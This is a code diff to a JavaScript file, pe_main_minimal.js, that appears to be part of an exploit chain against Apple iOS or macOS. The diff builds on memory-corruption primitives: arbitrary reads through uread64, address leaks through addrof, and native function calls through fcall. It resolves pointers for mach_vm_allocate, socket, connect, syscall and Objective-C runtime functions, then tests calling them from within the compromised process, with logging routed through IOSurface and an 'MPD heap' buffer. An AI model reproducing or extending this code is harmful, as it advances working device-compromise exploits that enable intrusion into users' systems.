@@ -54,7 +54,6 @@ if (!globalThis._surf || globalThis._surf == 0n) {
     if (_lb != 0n && _lb_off_ptr != 0n) {
       globalThis._surf = _lb;
       globalThis._log_offset_ptr = _lb_off_ptr;
-      // Re-define iosurf_log and pw to write to pe_log_buf (MPD heap) instead of IOSurface
       iosurf_log = function(msg) {
         try {
           let off = uread64(globalThis._log_offset_ptr);
@@ -79,18 +78,62 @@ pw("START: pe_main_minimal.js executing");
 try {
   fcall_init();
   pw("fcall_init OK");
-  // Now also set print as secondary output (writes to log_buffer + syslog)
+
+  // Read pre-resolved function pointers from func_offsets_buffer
+  // Indices: 0-13 = sbx1 fcall chain, 14-19 = basics, 20-45 = expanded set
+  let _fob_buf = uread64(addrof(func_offsets_array) + 0x10n);
+  let read_fo = (idx) => uread64(_fob_buf + BigInt(idx) * 0x8n);
+
+  // Read expanded set [20-45]
+  let _CALLOC     = read_fo(20);  pw("fo[20] calloc=" + _CALLOC.hex());
+  let _USLEEP     = read_fo(21);  pw("fo[21] usleep=" + _USLEEP.hex());
+  let _CLOSE      = read_fo(22);
+  let _MVA        = read_fo(23);  pw("fo[23] mach_vm_allocate=" + _MVA.hex());
+  let _MVD        = read_fo(24);
+  let _MPA        = read_fo(25);
+  let _MPDA       = read_fo(26);
+  let _SYSCALL    = read_fo(27);
+  let _MME64      = read_fo(28);
+  let _SLEEP      = read_fo(29);
+  let _SOCKET     = read_fo(30);  pw("fo[30] socket=" + _SOCKET.hex());
+  let _CONNECT    = read_fo(31);
+  let _SSO        = read_fo(32);
+  let _GSO        = read_fo(33);
+  let _OBJC_ALLOC = read_fo(34);
+  let _OBJC_ALLOC_INIT = read_fo(35);
+  let _OBJC_GETCLASS   = read_fo(36);
+  let _OBJC_MSGSEND    = read_fo(37);
+  let _SEL_REGNAME     = read_fo(38);
+  let _OBJC_RELEASE    = read_fo(39);
+  let _CFSCS       = read_fo(40);
+  let _CFR         = read_fo(41);
+  let _kCFAllocDef = read_fo(45); pw("fo[45] kCFAllocatorDefault=" + _kCFAllocDef.hex());
+
+  // Verify key functions are non-zero
+  let ok = true;
+  if (_CALLOC == 0n)     { pw("MISSING: calloc"); ok = false; }
+  if (_MVA == 0n)        { pw("MISSING: mach_vm_allocate"); ok = false; }
+  if (_SOCKET == 0n)     { pw("MISSING: socket"); ok = false; }
+  if (ok) pw("All pre-resolved functions OK");
+
+  // Test calloc via fcall
+  let test_buf = fcall(_CALLOC, 1n, 8n);
+  pw("calloc test: " + test_buf.hex());
+
+  // Test getpid
+  let _GETPID = read_fo(14);
+  let pid = fcall(_GETPID);
+  pw("getpid() = " + pid);
+
+  // Now also set print as secondary output
   let _old_pw = globalThis.pw;
   globalThis.pw = function(s) {
-    _old_pw(s);           // IOSurface (immediate visibility)
-    try { print(s); } catch(e) {} // log_buffer + syslog (persistent)
+    _old_pw(s);
+    try { print(s); } catch(e) {}
   };
-  let pid = fcall(func_resolve("getpid"));
-  pw("getpid() = " + pid);
 } catch(e) {
   pw("FAILED: " + (e.message || e));
   try {
-    // Last attempt: try print directly
     globalThis.pw = print;
     pw("FAILED(print): " + (e.message || e));
   } catch(e2) {
